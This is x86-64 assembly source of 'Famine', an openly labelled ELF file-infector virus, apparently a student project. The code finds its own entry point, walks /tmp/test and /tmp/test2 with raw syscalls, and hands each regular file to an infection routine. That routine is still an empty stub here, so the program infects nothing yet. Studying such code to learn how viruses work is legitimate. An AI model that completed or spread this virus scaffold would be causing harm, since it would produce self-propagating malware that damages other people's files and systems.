section.text:
	global _start:function

;-------------------------------------------------------------------------------
;|   r8   | virus entry                                                        |
;|   r9   | end of virus (without params)                                      |
;-------------------------------------------------------------------------------

;-> Save bytes:
;	mov x, 1 => 5 bytes
;but:
;	push 1
;	pop x
;			=> 3 bytes
;and
;xor x, x => 3 bytes (put 0 into x)

; function parameters are always (rdi, rsi, rdx, rcx, r8, r9) in this specific order
; (make sense with syscall)

_start:
	call _inject; push addr to stack
%ifdef DEBUG; ==================================================================
	db `....FAMINE....`, 0x0

newline db `\n`, 0x0

_print:; (string rdi) - use rdi, rsi, rdx, rax, rbx(temp)
	push rdx
	push rbx
	push rsi

	call _ft_strlen; ft_strlen(rdi)
	push rdi; mov rsi, rdi
	pop rsi
	push rax
	pop rdx
	push 1; mov rax, 1
	pop rax; write
	push 1; mov rdi, 1
	pop rdi
	syscall

	push rsi
	pop rbx
	lea rsi, [rel newline]
	push 1
	pop rax; write
	push 1
	pop rdx
	syscall
	push rbx
	pop rdi

	pop rsi
	pop rbx
	pop rdx
ret

%endif; ========================================================================

_inject:
	pop rdi; pop addr from stack
	push rdx; save register
	%ifdef DEBUG
		call _print; _print(rdi)
	%endif
	sub rdi, 0x5; sub call instr
	push rdi; mov r8, rsi
	pop r8
; r8 contains the entry of the virus

	lea rdi, [rel directories]
	xor rcx, rcx; = 0
	.loop_array_string:
		add rdi, rcx
		call _infect_dir
		xor rcx, rcx; = 0
		.next_string:; seek next dir
			inc rcx
			cmp byte[rdi + rcx], 0x0
			jnz .next_string
		inc rcx
		cmp byte[rdi + rcx], 0x0
		jnz .loop_array_string

	xor rax, rax; = 0
	cmp rax, [rel entry_inject]; if entry_inject isn't set we are in host
	jnz _infected
	jmp _host

_infect_dir:; (string rdi)
	push rcx

	%ifdef DEBUG
		call _print; _print(rdi)
	%endif
	push 2
	pop rax; open
	push 0o0200000; O_RDONLY | O_DIRECTORY
	pop rsi
	syscall
	cmp rax, 0x0
	jl .return; jump lower

	push rdi
	pop r10; path
	push rax
	pop r13; fd

	push r12
	sub rsp, 1024
	.getdents:
		mov rdi, r13
		push 78
		pop rax; getdents
		push 1024
		pop rdx; size of buffer
		mov rsi, rsp; buffer
		syscall
		push rsi
		pop r12
		cmp rax, 0x0
		jle .close
		push rax
		pop rdx; nread
		xor rcx, rcx; = 0

	.loop_in_dir:
		cmp rcx, rdx
		jge .getdents; rcx >= rdx
		mov rdi, r12
		add rdi, rcx; r12 => linux_dir
		; if not . .. +18
		add rdi, 18; linux_dir->d_name
		%ifdef DEBUG
			call _print; _print(rdi)
		%endif
		
		; ft_strcmp with '.' and '..' to not infect_dir with them
		push rcx
		lea rsi, [rel dotdir]
		xor rcx, rcx; = 0
		.loop_array_string:
			add rsi, rcx
			call _ft_strcmp
			cmp rax, 0
			je .next_dir
			xor rcx, rcx; = 0
			.next_string:; seek next dir
				inc rcx
				cmp byte[rsi + rcx], 0x0
				jnz .next_string
			inc rcx
			cmp byte[rsi + rcx], 0x0
			jnz .loop_array_string

			%ifdef DEBUG
				call _print; _print(rdi)
			%endif

		; concat_path
			push rbx
			sub rsp, 4096

			push rdi
			pop rbx
			mov rsi, r10
			mov rdi, rsp; buffer
			call _ft_strcpy
			call _ft_strlen
			add rdi, rax
			mov byte[rdi], '/'
			add rdi, 1
			mov rsi, rbx
			call _ft_strcpy
			mov rdi, rsp

			%ifdef DEBUG
				call _print; _print(rdi)
			%endif

		; check infect_dir or infect_file
			sub rsp, 600

			push 4
			pop rax ; stat
			mov rsi, rsp ; struct stat
			syscall
			cmp rax, 0x0
			jne .free_buffers

			mov eax, [rsi + 24]; statbuf.st_mode
			and eax, 0o0170000
;			cmp eax, 0o0040000
;			je .infect_dir
			cmp eax, 0o0100000
			je .infect_file
			add rsp, 600
			jmp .free_buffers

		.infect_dir:
			call _infect_dir
			add rsp, 600
			jmp .free_buffers

		.infect_file:
			call _infect_file
			add rsp, 600

		.free_buffers:
			add rsp, 4096
			pop rbx

		.next_dir:
			pop rcx
			mov rsi, r12
			add rsi, rcx
			push rdi
			movzx edi, word [rsi + 16]; linux_dir->d_reclen
			add rcx, rdi
			pop rdi
			jmp .loop_in_dir

	.close:
		push 3
		pop rax; close
		syscall

		push r10
		pop rdi

	.return:
		push rdi
		pop rsi
		add rsp, 1024
		pop r12
		pop rcx
ret

_infect_file:
ret

_host:
	jmp _check_end
	_back_host:
		pop r9
; r9 contains the end of the virus (minus params)
	jmp _exit

_infected:
	jmp _exit

	push rdx
	push rdx
_exit:
	pop rdx
	pop r13
	pop r14
	pop r15

	mov rax, 60 ; exit
	xor rdi, rdi; = 0
	syscall

; ================================ utils =======================================

_ft_strlen:; (string rdi) - use rcx, rsi
	push rcx

	xor rcx, rcx; = 0
	.loop_char:
		cmp byte [rdi + rcx], 0
		jz .return
		inc rcx
		jmp .loop_char
	.return:
		push rcx
		pop rax

		pop rcx
ret

_ft_strcmp: ; (string rdi, string rsi) - use rcx, rdi, rsi, rax
	push rcx

	xor rcx, rcx; = 0
	.loop_char:
		mov al, [rdi + rcx]
		cmp al, [rsi + rcx]
		jne .return
		cmp al, 0x0
		je .return
		inc rcx
	jmp .loop_char
	.return:
		sub al, [rsi + rcx]

	pop rcx
ret

_ft_strcpy: ; (string rdi, string rsi)
	push rcx

	xor rcx, rcx; = 0
	.loop_char:
		mov al, [rsi + rcx]
		mov [rdi + rcx], al
		cmp byte[rsi + rcx], 0x0
		je .return
		inc rcx
	jmp .loop_char
	.return:
		mov rax, rdi

	pop rcx
ret

; ==============================================================================

dotdir db `.`, 0x0, `..`, 0x0, 0x0
directories db `/tmp/test`, 0x0, `/tmp/test2`, 0x0, 0x0
db `Famine version 1.0 (c)oded by lmartin`; sw4g signature

_check_end:
	call _back_host; push addr to stack

_params:
	vaddr dq 0x0
	entry_inject dq 0x0
	entry_prg dq 0x0
